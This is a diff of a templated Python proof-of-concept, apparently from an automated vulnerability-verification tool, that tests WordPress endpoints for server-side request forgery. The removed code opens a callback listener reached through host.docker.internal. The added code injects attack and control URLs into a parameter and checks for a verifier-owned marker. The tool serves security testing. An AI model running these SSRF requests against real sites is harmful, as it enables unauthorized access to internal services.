@@ -1,80 +1,149 @@
-import http.server
-import socket
-import threading
-import time
-import requests
-from wp_login import wp_login
-from poc_result import emit_result
+import re
 
-TARGET = "{{ target_url }}"
-ACTION = "{{ ajax_action }}"
-PARAM  = "{{ injectable_param }}"
-ATTACKER_ROLE = "{{ attacker_role }}"
-USERNAME = "{{ test_username }}"
-PASSWORD = "{{ test_password }}"
+import requests
+
+from poc_result import emit_result
+from wp_login import wp_login, wp_rest_nonce
+
+TARGET = {{ target_url | tojson }}
+METHOD = {{ request_method | default("") | tojson }}
+ROUTE = {{ request_route | default("") | tojson }}
+DISPATCH = {{ request_dispatch | default({}) | tojson }}
+ENDPOINT = f"{TARGET.rstrip('/')}{ROUTE}" if ROUTE else ""
+DESTINATION_PARAMETER = {{ injectable_param | tojson }}
+DESTINATION_LOCATION = {{ ssrf_destination_location | default("") | tojson }} or (
+    "query" if METHOD in {"GET", "HEAD", "DELETE"} else "form"
+)
+ATTACK_URL = {{ ssrf_attack_url | default("") | tojson }}
+CONTROL_URL = {{ ssrf_control_url | default("") | tojson }}
+ORACLE_MODE = {{ ssrf_oracle_mode | default("http") | tojson }}
+ATTACKER_ROLE = {{ attacker_role | tojson }}
+USERNAME = {{ test_username | tojson }}
+PASSWORD = {{ test_password | tojson }}
+MARKER_RE = re.compile(r"SQUADRONE_SSRF_[0-9a-f]{64}")
+
+
+def _dispatch_fields():
+    query = {}
+    form = {}
+    json_body = {}
+    for located_name, value in DISPATCH.items():
+        location, separator, name = located_name.partition(":")
+        if not separator or not name:
+            continue
+        if location == "query":
+            query[name] = value
+        elif location == "form":
+            form[name] = value
+        elif location == "json":
+            json_body[name] = value
+    return query, form, json_body
+
+
+def _send(session, destination, headers):
+    query, form, json_body = _dispatch_fields()
+    selected = {
+        "query": query,
+        "form": form,
+        "json": json_body,
+    }.get(DESTINATION_LOCATION)
+    if selected is None:
+        raise RuntimeError("unsupported SSRF destination location")
+    selected[DESTINATION_PARAMETER] = destination
+    return session.request(
+        METHOD,
+        ENDPOINT,
+        params=query or None,
+        data=form or None,
+        json=json_body or None,
+        headers=headers,
+        timeout=30,
+        allow_redirects=False,
+    )
+
+
+def _unique_marker(response):
+    markers = set(MARKER_RE.findall(response.text))
+    return next(iter(markers)) if len(markers) == 1 else ""
 
 session = requests.Session()
+attacker_user_id = "anonymous"
+identity_verified = ATTACKER_ROLE.lower() in {"unauthenticated", "anonymous", "guest"}
 if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
     login = wp_login(session, TARGET, USERNAME, PASSWORD)
     if not login.success:
         raise RuntimeError(f"attacker login failed: {login.reason}")
+    attacker_user_id = str(login.identity.user_id)
+    identity_verified = True
 
-# Spin a tiny HTTP listener on the host loopback. If the target fetches it,
-# the SSRF is confirmed end-to-end.
-HITS: list[tuple[str, str]] = []
-
-class _H(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        HITS.append((self.client_address[0], self.path))
-        self.send_response(200); self.end_headers()
-        self.wfile.write(b"ok")
-    def log_message(self, *a, **k): pass
-
-def _free_port() -> int:
-    s = socket.socket()
-    s.bind(("0.0.0.0", 0))
-    p = s.getsockname()[1]; s.close()
-    return p
-
-LISTEN_PORT = _free_port()
-server = http.server.HTTPServer(("0.0.0.0", LISTEN_PORT), _H)
-threading.Thread(target=server.serve_forever, daemon=True).start()
-
-# host.docker.internal is reachable from a Docker container on Mac/Win.
-ATTACK_URLS = [
-    f"http://host.docker.internal:{LISTEN_PORT}/squadrone_ssrf",
-    f"http://172.17.0.1:{LISTEN_PORT}/squadrone_ssrf",
-]
-
-for url in ATTACK_URLS:
-    session.post(
-        f"{TARGET}/wp-admin/admin-ajax.php",
-        data={"action": ACTION, PARAM: url},
-        timeout=30,
-    )
-
-time.sleep(2)
-attack_hits = list(HITS)
-HITS.clear()
-session.post(
-    f"{TARGET}/wp-admin/admin-ajax.php",
-    data={"action": ACTION, PARAM: "not-a-url-control"},
-    timeout=30,
+# Cookie-authenticated REST routes require the normal WordPress REST nonce. Login
+# and nonce acquisition happen before the two proof-bound requests.
+headers = {}
+is_rest = ROUTE.startswith("/wp-json/") or any(
+    key == "query:rest_route" for key in DISPATCH
 )
-time.sleep(1)
-control_hits = list(HITS)
-server.shutdown()
+if is_rest and identity_verified and attacker_user_id != "anonymous":
+    nonce = wp_rest_nonce(session, TARGET)
+    if not nonce.success:
+        raise RuntimeError(f"REST nonce acquisition failed: {nonce.reason}")
+    headers["X-WP-Nonce"] = nonce.nonce
 
-# A callback proves the request primitive, not meaningful CIA impact. Keep this
-# non-vulnerable until the PoC is refined to demonstrate access to a protected
-# internal service or secret that the attacker cannot obtain directly.
-callback_primitive = bool(attack_hits) and not control_hits
+ready = bool(
+    ENDPOINT
+    and METHOD
+    and DESTINATION_PARAMETER
+    and ATTACK_URL
+    and CONTROL_URL
+    and ATTACK_URL != CONTROL_URL
+)
+attack_response = _send(session, ATTACK_URL, headers) if ready else None
+control_response = _send(session, CONTROL_URL, headers) if ready else None
+
+attack_marker = _unique_marker(attack_response) if attack_response is not None else ""
+control_marker = _unique_marker(control_response) if control_response is not None else ""
+confirmed = bool(attack_marker and not control_marker)
+fingerprint = {
+    "method": METHOD,
+    "route": ROUTE,
+    "destination_parameter": DESTINATION_PARAMETER,
+    "destination_location": DESTINATION_LOCATION,
+    "dispatch": DISPATCH,
+    "csrf_fields": [],
+}
 emit_result(
-    verdict="not_vulnerable",
-    oracle="callback",
+    verdict="vulnerable" if confirmed else "not_vulnerable",
+    oracle="response_marker",
     attacker_role=ATTACKER_ROLE,
-    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
-    attack={"observed": callback_primitive, "hit_count": len(attack_hits), "hits": attack_hits},
-    control={"observed": bool(control_hits), "hit_count": len(control_hits), "hits": control_hits},
-    impact="A server-side callback alone does not demonstrate confidentiality, integrity, or availability impact.",
+    request={"method": METHOD, "url": ENDPOINT},
+    attack={
+        "observed": confirmed,
+        "marker": attack_marker,
+        "marker_present": bool(attack_marker),
+        "destination_url": ATTACK_URL,
+        "attacker_user_id": attacker_user_id,
+        "identity_verified": identity_verified,
+        "status_code": attack_response.status_code if attack_response is not None else None,
+        "request_fingerprint": fingerprint,
+    },
+    control={
+        "observed": False,
+        "marker_present": bool(control_marker),
+        "destination_url": CONTROL_URL,
+        "attacker_user_id": attacker_user_id,
+        "identity_verified": identity_verified,
+        "status_code": control_response.status_code if control_response is not None else None,
+        "request_fingerprint": fingerprint,
+    },
+    confidentiality="low" if confirmed else "none",
+    impact=(
+        (
+            "The caller read a verifier-owned marker from a protected target-local "
+            "resource through the server-side URL wrapper."
+            if ORACLE_MODE == "local_resource"
+            else "The caller read a verifier-owned marker returned only to the "
+            "WordPress server over its server-side network path."
+        )
+        if confirmed
+        else "No protected server-side response marker was observed."
+    ),
 )
